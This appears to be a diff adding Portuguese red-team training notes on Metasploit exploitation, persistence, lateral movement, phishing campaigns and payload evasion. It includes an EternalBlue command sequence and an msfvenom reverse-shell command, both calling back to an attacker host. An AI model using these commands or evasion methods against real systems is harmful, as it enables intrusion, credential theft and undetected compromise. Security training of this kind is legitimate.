+- Utilize bancos como [NVD](https://nvd.nist.gov/) para pesquisa de vulnerabilidades  
+- Pratique análise em ambientes de teste antes de atuar em produção  
+- Documente vulnerabilidades encontradas para relatórios  
+
+---
+
+ ✅ Conclusão
+
+Conhecer as principais vulnerabilidades da CVE e OWASP é fundamental para o Red Team N1 planejar e executar testes eficazes, contribuindo para uma postura de segurança mais robusta.
+
+---
+
+ 🔴 Red Team N1: Uso do Metasploit Framework para Exploits Simples
+
+O Metasploit Framework é uma das ferramentas mais poderosas e populares para testes de penetração. No nível N1, aprender a usar exploits simples com o Metasploit é essencial para iniciar ataques controlados e entender o processo de exploração.
+
+---
+
+ 🧠 Por que usar o Metasploit?
+
+```
+
+- Biblioteca extensa de exploits e payloads prontos  
+- Automatiza grande parte do processo de exploração  
+- Permite aprender conceitos de vulnerabilidades na prática  
+- Suporte a múltiplas plataformas e serviços  
+
+---
+
+ 🧱 Passos básicos para usar exploits simples
+
+```
+
+1. **Iniciar o Metasploit:**  
+   msfconsole
+
+2. **Buscar o exploit desejado:**  
+   search <nome_do_exploit>
+
+3. **Selecionar o exploit:**  
+   use <caminho_do_exploit>
+
+4. **Configurar o alvo:**  
+   set RHOST <IP_do_alvo>  
+   set RPORT <porta_do_serviço>
+
+5. **Configurar o payload:**  
+   set PAYLOAD <payload_compatível>
+
+6. **Configurar outras opções (ex: LHOST para payload reverso):**  
+   set LHOST <seu_IP>
+
+7. **Executar o exploit:**  
+   run / exploit
+
+---
+
+ 🔍 Exemplo prático: exploit SMB (MS17-010)
+
+```
+
+msfconsole  
+search ms17_010  
+use exploit/windows/smb/ms17_010_eternalblue  
+set RHOST 192.168.1.100  
+set PAYLOAD windows/x64/meterpreter/reverse_tcp  
+set LHOST 192.168.1.50  
+exploit
+
+---
+
+ ⚙️ Dicas para Red Team N1
+
+```
+
+- Teste sempre em ambientes controlados e autorizados  
+- Estude a documentação de cada exploit para entender pré-requisitos  
+- Use payloads compatíveis com o sistema alvo  
+- Documente o processo e resultados para aprendizado  
+
+---
+
+ ✅ Conclusão
+
+O Metasploit Framework é uma ferramenta indispensável para o Red Team N1. Dominar o uso de exploits simples permite acelerar o aprendizado e preparar o profissional para desafios mais complexos.
+
+---
+
+ 🔴 Red Team N1: Técnicas de Exploração Manual e Automatizada
+
+Explorar vulnerabilidades é o passo crucial após o reconhecimento. Entender as diferenças entre exploração manual e automatizada ajuda a escolher a melhor abordagem para cada cenário.
+
+---
+
+ 🧠 Exploração Manual
+
+```
+
+- Realizada diretamente pelo analista usando ferramentas e comandos  
+- Permite maior controle e customização das ações  
+- Útil para ambientes complexos ou onde automação falha  
+- Exemplo: usar netcat para abrir uma shell reversa, executar comandos específicos, modificar payloads  
+
+---
+
+ 🧱 Exploração Automatizada
+
+```
+
+- Utiliza ferramentas e frameworks que automatizam o processo  
+- Acelera a exploração e permite escalar testes em múltiplos alvos  
+- Pode incluir scanners de vulnerabilidades, scripts, Metasploit  
+- Exemplo: usar Metasploit para aplicar exploits e payloads automaticamente  
+
+---
+
+ 🔍 Quando usar cada técnica?
+
+```
+
+- Use exploração manual para entender profundamente a vulnerabilidade e adaptar ataques  
+- Use exploração automatizada para testes rápidos e abrangentes em múltiplos sistemas  
+- Combine ambas para maximizar resultados e eficiência  
+
+---
+
+ ⚙️ Ferramentas comuns
+
+```
+
+- **Manual:** netcat, socat, scripts personalizados, ferramentas CLI  
+- **Automatizada:** Metasploit, Nessus, OpenVAS, scanners de vulnerabilidade  
+
+---
+
+ ✅ Dicas para Red Team N1
+
+```
+
+- Sempre pratique exploração em ambientes controlados  
+- Documente os passos para aprendizado e replicação  
+- Avalie os riscos de causar instabilidade ou danos nos sistemas  
+- Aprenda a ajustar e modificar ferramentas para melhor adequação  
+
+---
+
+ ✅ Conclusão
+
+Dominar tanto as técnicas de exploração manual quanto automatizada é essencial para o Red Team N1. Essa versatilidade prepara o profissional para atuar com eficiência em diversos cenários de ataque.
+
+---
+
+ 🔴 Red Team N1: Prática – Explorar Vulnerabilidade Conhecida em Ambiente Controlado
+
+Praticar a exploração de vulnerabilidades conhecidas em um ambiente seguro é fundamental para desenvolver habilidades técnicas, entender os impactos e aprender a controlar riscos durante um ataque real.
+
+---
+
+ 🧠 Objetivos da prática
+
+- Aplicar conceitos teóricos na prática  
+- Entender o funcionamento da vulnerabilidade e sua exploração  
+- Desenvolver técnicas para controle e pós-exploração  
+- Garantir segurança durante o teste, evitando danos reais  
+
+---
+
+ 🧱 Pré-requisitos
+
+```
+
+- Ambiente de laboratório com máquinas vulneráveis (ex: Metasploitable, Windows desatualizado)  
+- Ferramentas como Metasploit, nmap e netcat instaladas  
+- Permissão e controle para realizar os testes  
+```
+
+---
+
+ 🔍 Passo a passo sugerido
+
+```
+
+1. Identifique a vulnerabilidade alvo (ex: CVE-2017-0144 – EternalBlue)  
+2. Faça reconhecimento para confirmar o alvo (scan de portas, serviços)  
+3. Configure o exploit no Metasploit ou ferramenta manual  
+4. Defina payload e parâmetros (IP, portas)  
+5. Execute a exploração e observe o resultado  
+6. Teste comandos básicos de pós-exploração (ex: abrir shell, coletar dados)  
+7. Documente todo o processo e resultados  
+
+---
+
+ ⚙️ Cuidados importantes
+
+```
+
+- Use snapshots para restaurar a máquina rapidamente  
+- Nunca execute exploits em ambientes produtivos sem autorização  
+- Monitore o impacto no sistema durante o teste  
+- Aprenda com falhas e ajuste as técnicas para maior sucesso  
+
+---
+
+ ✅ Benefícios da prática
+
+- Aprofundamento técnico em vulnerabilidades reais  
+- Melhora na confiança para executar testes em produção  
+- Compreensão dos riscos e mitigação durante exploração  
+- Desenvolvimento de habilidades para reportar e mitigar falhas  
+
+---
+
+ ✅ Conclusão
+
+Explorar vulnerabilidades conhecidas em ambientes controlados é uma etapa essencial para o Red Team N1 ganhar experiência prática e atuar com segurança e eficácia em cenários reais.
+
+---
+
+ 🔴 Red Team N1: Técnicas para Manter Acesso (Persistência)
+
+Após explorar uma vulnerabilidade e obter acesso ao sistema, é fundamental garantir que esse acesso seja mantido para permitir ações futuras. Técnicas de persistência são usadas para isso, garantindo que o atacante possa retornar mesmo após reinicializações ou tentativas de limpeza.
+
+---
+
+ 🧠 O que é persistência?
+
+```
+
+- Conjunto de métodos usados para manter o controle sobre um sistema comprometido  
+- Permite acesso contínuo mesmo após reboot ou tentativas de remoção  
+- Essencial para ataques prolongados e movimentação lateral  
+
+---
+
+ 🧱 Técnicas comuns de persistência
+
+```
+
+- **Criação de contas de usuário escondidas**  
+- **Modificação de serviços ou tarefas agendadas (Windows Task Scheduler, cron jobs)**  
+- **Manipulação de arquivos de inicialização (ex: autorun, startup folders)**  
+- **Instalação de backdoors ou rootkits**  
+- **Uso de técnicas de “living off the land” com ferramentas nativas do sistema**  
+
+---
+
+ 🔍 Exemplos práticos
+
+```
+
+- No Windows:  
+  - Adicionar usuário com privilégios administrativos via `net user`  
+  - Criar tarefa agendada que executa payload a cada reinício  
+- No Linux:  
+  - Inserir comandos em `.bashrc` ou `crontab`  
+  - Modificar scripts de inicialização como `/etc/rc.local`  
+
+---
+
+ ⚙️ Dicas para Red Team N1
+
+```
+
+- Utilize técnicas discretas para evitar detecção por antivírus e EDRs  
+- Documente os métodos usados para facilitar limpeza após o teste  
+- Teste a persistência após reiniciar o sistema para validar sucesso  
+- Combine várias técnicas para maior robustez  
+
+---
+
+ ✅ Conclusão
+
+Dominar técnicas de persistência é crucial para o Red Team N1 garantir acesso contínuo em ambientes comprometidos, ampliando as possibilidades de exploração e coleta de informações.
+
+---
+
+ 🔴 Red Team N1: Escalonamento de Privilégios Local e Remoto
+
+Escalonamento de privilégios é a técnica que permite ao atacante aumentar seus direitos de acesso no sistema, passando de um usuário comum para um nível mais privilegiado (ex: administrador ou root). Essa etapa é fundamental para ampliar o controle e executar ações críticas.
+
+---
+
+ 🧠 Tipos de escalonamento
+
+```
+
+- **Local:** ocorre dentro do próprio sistema onde o atacante já tem acesso limitado  
+- **Remoto:** envolve explorar vulnerabilidades em serviços remotos para ganhar privilégios mais altos  
+
+---
+
+ 🧱 Escalonamento local
+
+```
+
+- Exploração de falhas no sistema operacional, drivers ou softwares instalados  
+- Uso de exploits públicos para vulnerabilidades conhecidas (ex: CVE específicos)  
+- Busca por credenciais armazenadas ou mal protegidas  
+- Técnicas comuns:  
+  - SUID mal configurado em Linux  
+  - Serviços rodando com permissões elevadas  
+  - Exploração de vulnerabilidades em kernels ou softwares  
+
+---
+
+ 🧱 Escalonamento remoto
+
+```
+
+- Exploração de falhas em serviços de rede, como SMB, RDP, FTP, entre outros  
+- Ataques de força bruta ou exploração de vulnerabilidades para execução remota de código  
+- Técnicas comuns:  
+  - Exploração de vulnerabilidades como EternalBlue (MS17-010)  
+  - Ataques a serviços mal configurados ou expostos  
+
+---
+
+ 🔍 Ferramentas úteis
+
+```
+
+- **Local:** LinPEAS, WinPEAS, PowerUp, sudo exploits  
+- **Remoto:** Metasploit Framework, nmap scripts, exploits específicos  
+
+---
+
+ ⚙️ Dicas para Red Team N1
+
+```
+
+- Sempre faça reconhecimento detalhado para identificar possíveis vetores  
+- Teste técnicas de escalonamento em ambientes controlados antes de usar em produção  
+- Documente os métodos e evidências para relatórios  
+- Combine escalonamento com técnicas de persistência para ampliar controle  
+
+---
+
+ ✅ Conclusão
+
+Escalonamento de privilégios é um passo essencial para o Red Team N1 expandir o acesso conquistado e realizar ações avançadas no ambiente comprometido.
+
+---
+
+ 🔴 Red Team N1: Movimentação Lateral Dentro da Rede (Pass-the-Hash, RDP, SMB)
+
+Após obter acesso inicial a um sistema, a movimentação lateral é a técnica usada para explorar outros computadores na rede, aumentando o alcance do atacante e o impacto do ataque.
+
+---
+
+ 🧠 O que é movimentação lateral?
+
+```
+
+- Processo de se mover de um sistema comprometido para outros na mesma rede  
+- Permite acesso a recursos adicionais, dados sensíveis e controle mais amplo  
+- Explora falhas, credenciais e protocolos para alcançar novos alvos  
+
+---
+
+ 🧱 Técnicas comuns de movimentação lateral
+
+```
+
+- **Pass-the-Hash (PtH):** reutilização de hashes NTLM para autenticação sem conhecer a senha em texto claro  
+- **RDP (Remote Desktop Protocol):** acesso remoto a máquinas usando credenciais obtidas  
+- **SMB (Server Message Block):** exploração de compartilhamentos e execução remota de comandos  
+
+---
+
+ 🔍 Exemplos práticos
+
+```
+
+- Uso de ferramentas como **Mimikatz** para extrair hashes e credenciais  
+- Conexão via RDP com credenciais comprometidas para acessar outros hosts  
+- Utilização de **PsExec** para executar comandos remotamente via SMB  
+
+---
+
+ ⚙️ Dicas para Red Team N1
+
+```
+
+- Proteja as credenciais e colete o máximo possível para facilitar movimentação  
+- Utilize ferramentas automatizadas para acelerar o processo  
+- Sempre realize ações em ambientes controlados e autorizados  
+- Documente todos os passos para análise e relatório  
+
+---
+
+ ✅ Conclusão
+
+A movimentação lateral é essencial para expandir o impacto do Red Team dentro da rede. Dominar técnicas como Pass-the-Hash, RDP e SMB prepara o profissional para desafios reais de ataques avançados.
+
+---
+
+ 🔴 Red Team N1: Prática – Simular Movimentação Lateral e Coleta de Credenciais
+
+Realizar simulações práticas de movimentação lateral e coleta de credenciais é fundamental para desenvolver habilidades que permitem expandir o controle dentro da rede durante um ataque.
+
+---
+
+ 🧠 Objetivos da prática
+
+- Executar técnicas reais de movimentação lateral em ambiente controlado  
+- Extrair credenciais e hashes para acesso a novos sistemas  
+- Entender ferramentas e métodos usados por atacantes  
+- Documentar todo o processo para aprendizado e relatório  
+
+---
+
+ 🧱 Pré-requisitos
+
+```
+
+- Ambiente de laboratório com múltiplas máquinas (Windows/Linux) interligadas  
+- Ferramentas instaladas: Mimikatz, PsExec, RDP client, ferramentas para extração de hashes  
+- Permissão e controle para executar testes  
+
+---
+
+ 🔍 Passo a passo sugerido
+
+```
+
+1. Obtenha acesso inicial a uma máquina alvo (ex: com credenciais limitadas)  
+2. Use **Mimikatz** para extrair hashes e credenciais em memória  
+3. Utilize técnicas de **Pass-the-Hash** para autenticar em outra máquina  
+4. Acesse remotamente via **RDP** ou execute comandos via **PsExec**  
+5. Repita o processo para expandir o controle na rede  
+6. Documente cada etapa e evidências coletadas  
+
+---
+
+ ⚙️ Cuidados importantes
+
+```
+
+- Realize testes somente em ambientes autorizados e isolados  
+- Evite impactos no ambiente para não prejudicar sistemas  
+- Utilize snapshots para restaurar máquinas rapidamente após testes  
+- Garanta segurança das credenciais coletadas durante o processo  
+
+---
+
+ ✅ Benefícios da prática
+
+- Aprofundamento em técnicas reais de ataque  
+- Melhora na coordenação entre coleta de credenciais e movimentação  
+- Preparação para cenários reais de ataque e resposta  
+- Desenvolvimento de capacidade analítica e documentação técnica  
+
+---
+
+ ✅ Conclusão
+
+Simular movimentação lateral e coleta de credenciais é essencial para o Red Team N1 aprimorar habilidades ofensivas com segurança e eficiência, ampliando o conhecimento prático para ambientes corporativos.
+
+---
+
+ 🔴 Red Team N1: Fundamentos de Engenharia Social e Manipulação Humana
+
+A engenharia social é uma das técnicas mais poderosas e antigas usadas por atacantes para comprometer sistemas por meio da manipulação direta das pessoas. Entender esses fundamentos é essencial para planejar ataques e também para criar defesas eficazes.
+
+---
+
+ 🧠 O que é engenharia social?
+
+```
+
+- Técnica que explora o comportamento humano para obter acesso ou informações confidenciais  
+- Baseia-se em manipulação, confiança e exploração de emoções como medo, urgência e curiosidade  
+- Pode ser aplicada via telefone, e-mail, redes sociais ou interações presenciais  
+
+---
+
+ 🧱 Principais técnicas de engenharia social
+
+```
+
+- **Phishing:** envio de mensagens falsas para induzir vítimas a revelar dados ou clicar em links maliciosos  
+- **Pretexting:** criação de histórias falsas para enganar a vítima e obter informações  
+- **Baiting:** oferta de algo atraente para induzir a vítima a agir (ex: pendrive infectado)  
+- **Tailgating:** acesso físico não autorizado seguindo alguém que tem permissão  
+- **Spear phishing:** ataques direcionados a indivíduos específicos, baseados em informações prévias  
+
+---
+
+ 🔍 Como os Red Teams usam engenharia social
+
+```
+
+- Coleta de informações para construir pretextos convincentes  
+- Envio de e-mails e mensagens para induzir ações inseguras  
+- Uso de telefonemas para obter dados sensíveis ou acesso físico  
+- Integração com ataques técnicos para ampliar impacto  
+
+---
+
+ ⚙️ Dicas para Red Team N1
+
+```
+
+- Respeite sempre limites éticos e legais  
+- Planeje com cuidado para evitar causar danos ou constrangimento  
+- Combine engenharia social com outras técnicas técnicas para maximizar resultados  
+- Documente e analise as respostas para ajustar abordagens futuras  
+
+---
+
+ ✅ Conclusão
+
+Dominar os fundamentos da engenharia social e manipulação humana é vital para o Red Team N1 criar ataques realistas e efetivos, além de compreender melhor os vetores humanos que ameaçam a segurança.
+
+---
+
+ 🔴 Red Team N1: Criação de Campanhas de Phishing e Coleta de Credenciais
+
+Campanhas de phishing são uma das formas mais eficazes de comprometer usuários e obter acesso inicial em ambientes corporativos. Entender como planejar e executar essas campanhas é essencial para o Red Team.
+
+---
+
+ 🧠 O que é phishing?
+
+```
+
+- Técnica de engenharia social que engana usuários para que revelem informações sensíveis  
+- Geralmente envolve envio de e-mails ou mensagens falsas com links ou anexos maliciosos  
+- Objetivo: coletar credenciais, instalar malware ou ganhar acesso não autorizado  
+
+---
+
+ 🧱 Passos para criar uma campanha de phishing
+
+```
+
+1. **Planejamento:**  
+   - Definir objetivo e público-alvo  
+   - Escolher abordagem (ex: spear phishing, phishing em massa)  
+
+2. **Coleta de informações:**  
+   - Pesquisar detalhes do alvo para criar mensagens convincentes  
+   - Usar informações públicas (LinkedIn, redes sociais)  
+
+3. **Criação do conteúdo:**  
+   - Desenvolver e-mails, páginas falsas e anexos maliciosos  
+   - Usar técnicas para evitar filtros de spam e antivírus  
+
+4. **Execução:**  
+   - Enviar e-mails via ferramentas específicas  
+   - Monitorar cliques e interações  
+
+5. **Coleta e análise de credenciais:**  
+   - Armazenar informações capturadas de forma segura  
+   - Analisar dados para próximos passos do ataque  
+
+---
+
+ 🔍 Ferramentas comuns
+
+```
+
+- **Gophish:** plataforma open source para criar e gerenciar campanhas  
+- **SET (Social Engineering Toolkit):** automação de ataques sociais  
+- **Phishing Frenzy:** framework para phishing profissional  
+
+---
+
+ ⚙️ Cuidados éticos e legais
+
+```
+
+- Execute campanhas apenas em ambientes autorizados e para fins educacionais  
+- Informe e prepare a equipe alvo para evitar danos reais  
+- Respeite a privacidade e segurança dos usuários envolvidos  
+- Documente todas as etapas para análise e aprendizado  
+
+---
+
+ ✅ Conclusão
+
+Criar campanhas de phishing é uma habilidade crítica para o Red Team N1, permitindo testar a segurança humana da organização e identificar vulnerabilidades que técnicas técnicas não alcançam.
+
+---
+
+ 🔴 Red Team N1: Ferramentas para Criação de Páginas Falsas e Envio de Emails (Gophish, SET)
+
+Para executar campanhas de phishing eficazes, é essencial dominar ferramentas que facilitam a criação de páginas falsas e o envio de e-mails maliciosos. Duas das mais usadas são o Gophish e o Social Engineering Toolkit (SET).
+
+---
+
+ 🧠 Por que usar essas ferramentas?
+
+```
+
+- Automatizam o processo de criação e disparo de campanhas  
+- Permitem personalizar e-mails e páginas para maior taxa de sucesso  
+- Fornecem métricas e relatórios para análise do impacto  
+- Facilitam testes controlados e éticos  
+
+---
+
+ 🧱 Gophish
+
+```
+
+- Plataforma open source especializada em campanhas de phishing  
+- Interface web amigável para criar e gerenciar campanhas  
+- Suporte a templates de e-mails e páginas personalizadas  
+- Rastreamento de cliques, envios e respostas  
+- Fácil instalação em ambientes Linux/Windows  
+
+🔗 [https://getgophish.com/](https://getgophish.com/)
+
+---
+
+ 🧱 Social Engineering Toolkit (SET)
+
+```
+
+- Ferramenta open source focada em ataques de engenharia social  
+- Suporta criação de páginas falsas, envio de e-mails, ataques via USB e mais  
+- Automatiza geração de payloads para diversas plataformas  
+- Funciona via linha de comando, ideal para usuários avançados  
+- Integrável com outras ferramentas para ataques combinados  
+
+🔗 [https://github.com/trustedsec/social-engineer-toolkit](https://github.com/trustedsec/social-engineer-toolkit)
+
+---
+
+ 🔍 Como usar na prática
+
+```
+
+1. Defina o objetivo da campanha e o público-alvo  
+2. Crie templates de e-mails e páginas de phishing com as ferramentas  
+3. Configure servidores para hospedagem das páginas falsas  
+4. Dispare e-mails e monitore as interações  
+5. Colete credenciais e dados para análise  
+
+---
+
+ ⚙️ Dicas para Red Team N1
+
+```
+
+- Sempre realize testes em ambientes controlados e autorizados  
+- Customize mensagens para parecerem legítimas e evitar filtros  
+- Use relatórios para melhorar campanhas futuras  
+- Documente processos para aprendizado e compliance  
+
+---
+
+ ✅ Conclusão
+
+Dominar o Gophish e o SET é fundamental para o Red Team N1 executar campanhas de phishing profissionais e seguras, elevando a eficácia dos testes de engenharia social.
+
+---
+
+ 🔴 Red Team N1: Prática – Montar e Executar Campanha de Phishing Simulada
+
+Realizar uma campanha de phishing simulada em ambiente controlado é fundamental para entender os processos, ferramentas e desafios envolvidos em ataques reais.
+
+---
+
+ 🧠 Objetivos da prática
+
+- Planejar e criar uma campanha de phishing realista  
+- Configurar ferramentas para envio e monitoramento  
+- Coletar e analisar interações e credenciais simuladas  
+- Documentar todo o processo para aprendizado e melhorias  
+
+---
+
+ 🧱 Pré-requisitos
+
+```
+
+- Ambiente de laboratório isolado ou ambiente autorizado para testes  
+- Ferramentas instaladas: Gophish ou Social Engineering Toolkit (SET)  
+- Template de e-mail e página falsa preparada  
+- Permissões claras para executar o teste  
+
+---
+
+ 🔍 Passo a passo sugerido
+
+```
+
+1. Defina o objetivo e escopo da campanha (ex: conscientização interna)  
+2. Monte a lista de usuários-alvo (simulados ou reais com autorização)  
+3. Configure a ferramenta escolhida (Gophish/SET) para criar e enviar e-mails  
+4. Crie ou importe templates de e-mail e páginas de phishing  
+5. Hospede as páginas falsas em servidor controlado  
+6. Envie a campanha e monitore cliques, respostas e coleta de dados  
+7. Analise resultados e prepare relatório de lições aprendidas  
+
+---
+
+ ⚙️ Cuidados importantes
+
+```
+
+- Sempre informe os envolvidos sobre a simulação (quando aplicável)  
+- Evite causar pânico ou danos reais  
+- Respeite a privacidade e segurança dos dados coletados  
+- Use snapshots ou backups para restaurar ambientes após o teste  
+
+---
+
+ ✅ Benefícios da prática
+
+- Melhora a compreensão prática da engenharia social  
+- Avalia a efetividade das defesas humanas da organização  
+- Prepara a equipe para reconhecer e responder a ataques reais  
+- Fornece dados para aprimorar treinamentos e políticas de segurança  
+
+---
+
+ ✅ Conclusão
+
+Montar e executar campanhas de phishing simuladas é uma habilidade essencial para o Red Team N1, permitindo aplicar conhecimentos técnicos e sociais em ambientes seguros e controlados.
+
+---
+
+ 🔴 Red Team N2: Criar Payloads Usando Ferramentas como msfvenom
+
+Criar payloads personalizados é uma habilidade essencial para o Red Team N2, permitindo desenvolver ataques mais furtivos e adaptados ao ambiente alvo.
+
+---
+
+ 🧠 O que é msfvenom?
+
+```
+
+- Ferramenta do Metasploit Framework para gerar payloads e shellcodes  
+- Combina funcionalidades do msfpayload e msfencode  
+- Permite criar payloads para diversas plataformas, formatos e arquiteturas  
+- Suporta encoding para evitar detecção por antivírus  
+
+---
+
+ 🧱 Passos básicos para criar um payload
+
+```
+
+1. Escolha o tipo de payload (ex: reverse shell, bind shell)  
+2. Defina plataforma e arquitetura (Windows, Linux, x86, x64)  
+3. Configure parâmetros como IP e porta do listener (LHOST, LPORT)  
+4. Selecione formato de saída (exe, dll, elf, etc.)  
+5. Utilize opções de encoding para evitar detecção  
+
+---
+
+ 🔍 Exemplo prático: criar um payload reverse shell Windows
+
+```
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe
+
+---
+
+ ⚙️ Dicas para Red Team N2
+
+```
+
+- Teste payloads em ambientes controlados antes de usar em produção  
+- Combine msfvenom com outras ferramentas para customizar payloads  
+- Utilize técnicas de ofuscação para aumentar furtividade  
+- Documente configurações e parâmetros usados para replicar e ajustar  
+
+---
+
+ ✅ Conclusão
+
+Dominar a criação de payloads com msfvenom eleva o nível técnico do Red Team N2, proporcionando ataques mais sofisticados e eficazes.
+
+---
+
+ 🔴 Red Team N2: Introdução a Técnicas de Obfuscação e Evasão
+
+Para aumentar a eficácia dos ataques, é fundamental que o Red Team N2 conheça técnicas de obfuscação e evasão que dificultam a detecção por antivírus, EDRs e outras ferramentas de defesa.
+
+---
+
+ 🧠 O que é obfuscação e evasão?
+
+```
+
+- **Obfuscação:** técnicas usadas para esconder ou dificultar a análise de código malicioso  
+- **Evasão:** métodos para evitar a detecção por ferramentas de segurança, como antivírus, firewalls e sistemas de detecção  
+
+---
+
+ 🧱 Técnicas comuns de obfuscação
+
+```
+
+- Ofuscação de código (ex: criptografia, encoding, packing)  
+- Uso de scripts e macros complexos  
+- Técnicas de polimorfismo e metamorfismo  
+- Compressão e empacotamento de executáveis  
+
+---
+
+ 🧱 Técnicas comuns de evasão
+
+```
+
+- Detecção de sandbox e ambiente virtual para não executar em análise  
+- Uso de delay ou gatilhos para execução tardia  
+- Modificação de assinaturas para evitar detecção por antivírus  
+- Uso de protocolos e canais cifrados para comunicação  
+
+---
+
+ 🔍 Ferramentas úteis
+
+```
+
+- **Obfuscação:** Veil-Evasion, Hyperion, UPX  
+- **Evasão:** Cobalt Strike, Metasploit com custom payloads  
+- Scripts personalizados e técnicas manuais  
+
+---
+
+ ⚙️ Dicas para Red Team N2
+
+```
+
+- Teste os payloads em múltiplos ambientes para validar evasão  
+- Combine técnicas de obfuscação para dificultar a análise estática e dinâmica  
+- Esteja atento às atualizações das defesas para adaptar suas técnicas  
+- Documente métodos usados para aprimorar e replicar ataques  
+
+---
+
+ ✅ Conclusão
+
+Conhecer e aplicar técnicas de obfuscação e evasão é crucial para o Red Team N2 realizar ataques furtivos e eficientes, aumentando a chance de sucesso e evitando a detecção precoce.
+
+---
+
+ 🔴 Red Team N2: Ferramentas para Geração e Entrega de Payloads
+
+Para executar ataques avançados, o Red Team N2 deve dominar ferramentas que auxiliam na criação e entrega de payloads, permitindo maior controle e flexibilidade durante as operações ofensivas.
+
+---
+
+ 🧠 Por que usar ferramentas de geração e entrega?
+
+```
+
+- Facilitam a criação de payloads personalizados para diferentes ambientes  
+- Permitem entrega eficiente e furtiva em alvos específicos  
+- Automatizam processos complexos e aumentam a eficácia do ataque  
+- Integram múltiplas técnicas para superar defesas modernas  
+
+---
+
+ 🧱 Ferramentas populares para geração de payloads
+
+```
+
+- **msfvenom:** componente do Metasploit para criação de payloads customizados  
+- **Veil-Evasion:** ferramenta para criar payloads ofuscados e evitar detecção  
+- **PowerShell Empire:** framework para geração e entrega de payloads via PowerShell  
+
+---
+
+ 🧱 Ferramentas populares para entrega de payloads
+
+```
+
+- **Metasploit Framework:** oferece diversos vetores de entrega, incluindo exploits, phishing e execução remota  
+- **Cobalt Strike:** plataforma avançada para comando e controle e entrega de payloads  
+- **Social Engineering Toolkit (SET):** usada para campanhas de phishing e engenharia social  
+
+---
+
+ 🔍 Como funcionam na prática
+
+```
+
+1. Crie o payload usando ferramenta de geração (ex: msfvenom, Veil)  
+2. Escolha o vetor de entrega adequado ao alvo (phishing, exploit, USB, etc.)  
+3. Configure a ferramenta de entrega para disparar o payload  
+4. Monitore a conexão reversa e controle remoto do payload  
+5. Use técnicas de evasão para manter acesso sem ser detectado  
+
+---
+
+ ⚙️ Dicas para Red Team N2
+
+```
+
+- Sempre teste payloads em ambientes isolados para garantir funcionamento  
+- Combine diferentes ferramentas para criar campanhas mais sofisticadas  
+- Mantenha-se atualizado com as últimas técnicas de evasão e entrega  
+- Documente cada etapa para replicação e análise pós-ação  
+
+---
+
+ ✅ Conclusão
+
+Dominar ferramentas para geração e entrega de payloads é fundamental para o Red Team N2 ampliar suas capacidades ofensivas, realizando ataques mais furtivos, eficazes e adaptados ao ambiente alvo.
+
+---
+
+ 🔴 Red Team N2: Estudar Principais Técnicas de Detecção e Defesa Usadas por Blue Teams
+
+Para aprimorar suas habilidades ofensivas, o Red Team N2 deve conhecer as técnicas que os Blue Teams utilizam para detectar e mitigar ataques, permitindo planejar ações mais eficazes e furtivas.
+
+---
+
+ 🧠 Por que estudar técnicas de defesa?
+
+```
+
+- Compreender os mecanismos de detecção ajuda a evitar ser identificado  
+- Permite desenvolver estratégias para contornar defesas e manter acesso  
+- Facilita a criação de ataques mais sofisticados e realistas  
+- Melhora a colaboração e aprendizado entre equipes Red e Blue  
+
+---
+
+ 🧱 Principais técnicas de detecção usadas por Blue Teams
+
+```
+
+- **Monitoramento de logs:** análise contínua de eventos de segurança em sistemas e redes  
+- **Detecção baseada em assinaturas:** uso de regras para identificar padrões conhecidos de ataques  
+- **Análise comportamental:** identificação de atividades anômalas que indicam possível comprometimento  
+- **Integração SIEM e SOAR:** centralização e automação da resposta a incidentes  
+- **EDR (Endpoint Detection and Response):** monitoramento detalhado em endpoints para detectar comportamentos suspeitos  
+
+---
+
+ 🧱 Técnicas comuns de defesa e mitigação
+
+```
+
+- **Segmentação de rede e controle de acesso:** limita movimentação lateral e exposição  
+- **Atualizações e patches:** corrigem vulnerabilidades conhecidas  
+- **Treinamento e conscientização:** reduz risco de engenharia social  
+- **Backups e planos de recuperação:** minimizam impacto de incidentes  
+- **Implementação de políticas de segurança:** governança eficaz para proteger ativos  
+
+---
+
+ 🔍 Como usar esse conhecimento no Red Team
+
+```
+
+- Ajustar payloads para evitar assinaturas e comportamentos detectáveis  
+- Planejar ataques que explorem brechas nas defesas e evitem monitoramento  
+- Testar técnicas de evasão específicas contra EDRs e SIEMs  
+- Simular ataques realistas para treinar Blue Teams e melhorar defesas  
+
+---
+
+ ⚙️ Dicas para Red Team N2
+
+```
+
+- Estude cases reais de incidentes e resposta para entender dinâmicas de defesa  
+- Use laboratórios e ambientes simulados para validar técnicas ofensivas e defensivas  
+- Mantenha-se atualizado com novidades em ferramentas e técnicas de defesa  
+- Documente descobertas para compartilhar com sua equipe e aprimorar estratégias  
+
+---
+
+ ✅ Conclusão
+
+Conhecer as técnicas de detecção e defesa dos Blue Teams é essencial para o Red Team N2 executar ataques mais furtivos e eficazes, elevando a qualidade e realismo dos testes de segurança.
+
+---
+
+ 🔴 Red Team N2: Técnicas de Evasão de Sandbox e Análise Estática/Dinâmica
+
+Para aumentar a furtividade e eficácia dos ataques, o Red Team N2 deve dominar técnicas que evitem a detecção por sandboxes e análises automatizadas, tanto estáticas quanto dinâmicas.
+
+---
+
+ 🧠 O que são sandboxes e análises estáticas/dinâmicas?
+
+```
+
+- **Sandbox:** ambiente isolado onde malware é executado para observar seu comportamento  
+- **Análise estática:** exame do código ou arquivo sem executá-lo, buscando padrões e características suspeitas  
+- **Análise dinâmica:** execução controlada do malware para monitorar ações em tempo real  
+
+---
+
+ 🧱 Técnicas comuns de evasão de sandbox
+
+```
+
+- Detecção de ambiente virtual ou sandbox (ex: drivers, processos, registros específicos)  
+- Delay na execução de payload para evitar análise rápida  
+- Verificação de presença de usuários ativos (input do mouse, teclado)  
+- Execução condicional baseada em características do ambiente  
+- Criptografia ou packing do payload para dificultar análise  
+
+---
+
+ 🧱 Técnicas de evasão de análise estática
+
+```
+
+- Ofuscação de código e strings (ex: base64, XOR, compressão)  
+- Utilização de polymorphism e metamorphism para alterar a assinatura do código  
+- Fragmentação e segmentação do código para evitar assinaturas diretas  
+- Inclusão de código morto ou confuso para enganar analisadores  
+
+---
+
+ 🔍 Ferramentas e métodos usados
+
+```
+
+- Packers e crypters como UPX, Themida, Veil-Evasion  
+- Ferramentas customizadas para obfuscação e manipulação de código  
+- Técnicas avançadas integradas em frameworks como Cobalt Strike  
+
+---
+
+ ⚙️ Dicas para Red Team N2
+
+```
+
+- Teste os payloads em múltiplos ambientes para validar evasão  
+- Combine técnicas de evasão para aumentar a dificuldade da análise  
+- Atualize-se constantemente sobre novas detecções e contramedidas  
